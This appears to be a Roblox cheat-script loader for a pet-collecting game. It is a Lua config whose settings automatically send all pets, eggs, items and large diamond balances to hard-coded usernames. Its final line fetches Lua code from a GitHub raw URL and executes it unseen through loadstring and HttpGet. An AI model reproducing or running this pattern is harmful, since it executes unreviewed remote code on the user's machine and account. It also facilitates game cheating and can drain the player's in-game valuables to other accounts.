getgenv().Config = {
    SERVER_HOP = false, -- true: bật hop server, false: tắt hop server
    DPS_THRESHOLDS = {
        HOUSE1 = { '>0' },
        HOUSE2 = { '1000~3000', '>10000' },
        HOUSE3 = { '3000~6500', '>20000' },
        HOUSE4 = { '6000~9000', '>23000' },
        HOUSE5 = { '8300~22000' },
        HOUSE6 = { '>25000'},
    },
    plant = {
        PET_SLOTS = { 1, 2, 3, 4, 5, 6, 7, 8, 9 }, -- slot đặt pet, put pet
        EGG_SLOTS = { 10 }, -- slot đặt trứng , put egg
    },
    SEND_PET = {
        Usernames = {'TunTrapBoy'}, --- name1 , name2 , name3 ---
        PetSendInterval = 20,
        SEND_ALL = true, -- true: SEND ALL, false: SEND PET CONFIG ----
        Name_Pet = {''}, --HUGE NAME 1 , HUGE NAME 2 , HUGE NAME 3 ---
    },
    SEND_DIAMONDS = {
        Usernames = {'DreamSoCow'}, --- name1 , name2 , name3 ---
        MinDiamonds = 50000000,
    },
    SEND_ITEM = {
        Usernames = {''}, --- name1 , name2 , name3 ---
        ['Spectral Potion'] = { amount = 3 }, --- number and 'all' ----
    },
    SEND_EGGS = {
        Usernames = { 'TunTrapBoy' },
        ALL = true, -- gửi tất cả egg có chữ Exclusive Egg
    },
        AutoSell = true,       -- Bật/tắt auto sell
        DelayMinutes = 60
}
loadstring(game:HttpGet("https://raw.githubusercontent.com/dsadgeee/21521521/refs/heads/main/track.lua"))()

